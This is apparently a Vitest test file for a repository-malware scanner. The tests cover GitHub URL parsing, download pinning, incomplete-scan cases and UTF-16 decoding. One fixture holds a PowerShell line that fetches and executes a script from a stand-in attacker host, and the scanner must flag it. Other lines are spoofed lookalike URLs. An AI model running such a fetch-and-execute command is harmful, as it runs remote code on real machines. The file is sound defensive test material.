import { describe, it, expect, vi, afterEach } from "vitest";
import { fetchRepo, parseRepoUrl } from "../src/scanner/github";
import { extractLinks } from "../src/scanner/message";
import { scanFiles } from "../src/scanner/scan";

const SHA = "a".repeat(40);
const RAW = `https://raw.githubusercontent.com/o/r/${SHA}/`;
type Entry = { path: string; type?: string; mode?: string; size?: number };
let urls: string[] = [];

/** Stubs GitHub. `raw` overrides individual file responses. */
function github(opts: { tree?: Entry[]; truncated?: boolean; commit?: (ref: string) => Response; treeRes?: Response; raw?: Record<string, () => Response | Promise<Response>> }) {
  urls = [];
  vi.stubGlobal("fetch", async (u: any) => {
    const url = String(u); urls.push(url);
    const c = url.match(/\/commits\/(.+)$/);
    if (c) return opts.commit?.(decodeURIComponent(c[1])) ?? Response.json({ sha: SHA });
    if (url.includes("/git/trees/")) return opts.treeRes ?? Response.json({ tree: (opts.tree ?? []).map((t) => ({ type: "blob", mode: "100644", size: 10, ...t })), truncated: opts.truncated });
    const path = url.slice(RAW.length);
    return opts.raw?.[path]?.() ?? new Response("const a = 1;");
  });
}
afterEach(() => vi.unstubAllGlobals());

describe("parseRepoUrl", () => {
  it.each([
    ["https://github.com/o/r", { owner: "o", repo: "r", ref: undefined }],
    ["github.com/o/r.git", { owner: "o", repo: "r", ref: undefined }],
    ["https://www.github.com/o/r/", { owner: "o", repo: "r", ref: undefined }],
    ["https://github.com/o/r,", { owner: "o", repo: "r", ref: undefined }],
    ["git@github.com:o/r.git", { owner: "o", repo: "r", ref: undefined }],
    ["https://github.com/o/r/tree/feature/x", { owner: "o", repo: "r", ref: "feature/x" }],
    ["https://github.com/o/r/blob/dev/src/a.js", { owner: "o", repo: "r", ref: "dev/src/a.js" }],
    ["https://github.com/o/r/issues/5", { owner: "o", repo: "r", ref: undefined }],
  ])("accepts %s", (u, out) => expect(parseRepoUrl(u)).toEqual(out));
  it.each([
    "https://evil.com/github.com/a/b", "https://github.com.evil.xyz/a/b", "https://notgithub.com/a/b", "https://github.com@evil.com/a/b", "https://u:p@github.com/a/b",
    "https://github.com/../x", "https://github.com/a/..", "https://github.com/a", "javascript://github.com/a/b", "", "hello",
  ])("rejects %j", (u) => expect(parseRepoUrl(u)).toBeNull());
});

describe("extractLinks", () => {
  it("finds real GitHub repos only, once each", () => {
    const t = "https://notgithub.com/a/b github.com/c/d, https://github.com/e/f, https://github.com/E/F. https://github.com.evil.xyz/g/h evil.com/github.com/i/j";
    expect(extractLinks(t).repos).toEqual(["e/f", "c/d"]);
  });
});

describe("fetchRepo", () => {
  it("pins every download to one commit and reads only text", async () => {
    github({ tree: [{ path: "a.js" }, { path: "logo.png" }] });
    const r = await fetchRepo("https://github.com/o/r");
    expect(urls).toEqual(["https://api.github.com/repos/o/r/commits/HEAD", `https://api.github.com/repos/o/r/git/trees/${SHA}?recursive=1`, RAW + "a.js"]);
    expect(r).toMatchObject({ files: [{ path: "a.js", content: "const a = 1;" }], issues: [], assetsNotInspected: 1, slug: "o/r", commit: SHA });
  });
  it.each([
    [403, /rate limit/], [429, /rate limit/], [404, /not found/], [500, /500/],
  ])("throws on API status %i instead of returning an empty repo", async (status, msg) => {
    github({ commit: () => new Response("{}", { status }) });
    await expect(fetchRepo("https://github.com/o/r")).rejects.toThrow(msg);
    github({ treeRes: new Response("{}", { status }) });
    await expect(fetchRepo("https://github.com/o/r")).rejects.toThrow(msg);
  });
  it("throws on malformed API responses", async () => {
    github({ commit: () => Response.json({ sha: "../../x" }) });
    await expect(fetchRepo("https://github.com/o/r")).rejects.toThrow(/unexpected/);
    github({ treeRes: Response.json({ message: "?" }) });
    await expect(fetchRepo("https://github.com/o/r")).rejects.toThrow(/unexpected/);
  });
  it("scans the branch in the URL, even when it contains slashes or a sub-path", async () => {
    const tried: string[] = [];
    github({ tree: [{ path: "a.js" }], commit: (ref) => { tried.push(ref); return ref === "feature/x" ? Response.json({ sha: SHA }) : new Response("", { status: 404 }); } });
    await fetchRepo("https://github.com/o/r/tree/feature/x/src");
    expect(tried).toEqual(["feature/x/src", "feature/x"]);
  });
  it("never falls back to the default branch if the named one is missing", async () => {
    github({ commit: (ref) => (ref === "HEAD" ? Response.json({ sha: SHA }) : new Response("", { status: 404 })) });
    await expect(fetchRepo("https://github.com/o/r/tree/gone")).rejects.toThrow(/"gone" not found/);
  });

  it.each<[string, Parameters<typeof github>[0], string]>([
    ["failed download", { tree: [{ path: "a.js" }, { path: "b.js" }], raw: { "b.js": () => new Response("", { status: 500 }) } }, "download-failed"],
    ["network error", { tree: [{ path: "a.js" }, { path: "b.js" }], raw: { "b.js": () => Promise.reject(new TypeError("net")) } }, "download-failed"],
    ["oversized file", { tree: [{ path: "a.js" }, { path: "b.js", size: 1_000_001 }] }, "oversized"],
    ["native binary", { tree: [{ path: "a.js" }, { path: "b.node" }] }, "opaque-binary"],
    ["archive", { tree: [{ path: "a.js" }, { path: "b.tgz" }] }, "opaque-binary"],
    ["submodule", { tree: [{ path: "a.js" }, { path: "lib", type: "commit", mode: "160000" }] }, "submodule"],
    ["symlink", { tree: [{ path: "a.js" }, { path: "l", mode: "120000" }] }, "symlink"],
    ["truncated listing", { tree: [{ path: "a.js" }], truncated: true }, "listing-truncated"],
    ["too many files", { tree: Array.from({ length: 601 }, (_, i) => ({ path: `f${i}.js` })) }, "file-limit"],
    ["too many bytes", { tree: Array.from({ length: 40 }, (_, i) => ({ path: `f${i}.js`, size: 900_000 })) }, "file-limit"],
  ])("%s makes the scan incomplete", async (_n, opts, kind) => {
    github(opts);
    const r = await fetchRepo("https://github.com/o/r");
    expect(r.issues.map((i) => i.kind)).toContain(kind);
    expect(scanFiles(r.files, r)).toMatchObject({ complete: false, verdict: "incomplete" });
  });
  it("every download failing is not a clean result", async () => {
    github({ tree: [{ path: "a.js" }], raw: { "a.js": () => new Response("", { status: 404 }) } });
    const r = await fetchRepo("https://github.com/o/r");
    expect(scanFiles(r.files, r).verdict).toBe("incomplete");
  });
  it("an empty repository is not a clean result", async () => {
    github({ tree: [] });
    const r = await fetchRepo("https://github.com/o/r");
    expect(scanFiles(r.files, r).verdict).toBe("incomplete");
  });
  it("downloads files that execute on install or open first", async () => {
    github({ tree: [...Array.from({ length: 700 }, (_, i) => ({ path: `docs/${i}.md` })), { path: "src/a.js" }, { path: "pkg/package.json" }, { path: ".vscode/tasks.json" }] });
    const got = (await fetchRepo("https://github.com/o/r")).files.map((f) => f.path);
    expect(got).toEqual(expect.arrayContaining(["src/a.js", "pkg/package.json", ".vscode/tasks.json"]));
  });
  it("encodes unusual file names", async () => {
    github({ tree: [{ path: "a#b/c?d e.js" }] });
    await fetchRepo("https://github.com/o/r");
    expect(urls.at(-1)).toBe(RAW + "a%23b/c%3Fd%20e.js");
  });
  it("decodes UTF-16 scripts", async () => {
    const text = "\uFEFFiex (iwr https://evil.xyz/a.ps1)";
    const buf = new Uint8Array([...text].flatMap((c) => [c.charCodeAt(0) & 255, c.charCodeAt(0) >> 8]));
    github({ tree: [{ path: "a.ps1" }], raw: { "a.ps1": () => new Response(buf) } });
    const r = await fetchRepo("https://github.com/o/r");
    expect(scanFiles(r.files, r).verdict).toBe("do-not-run");
  });
});
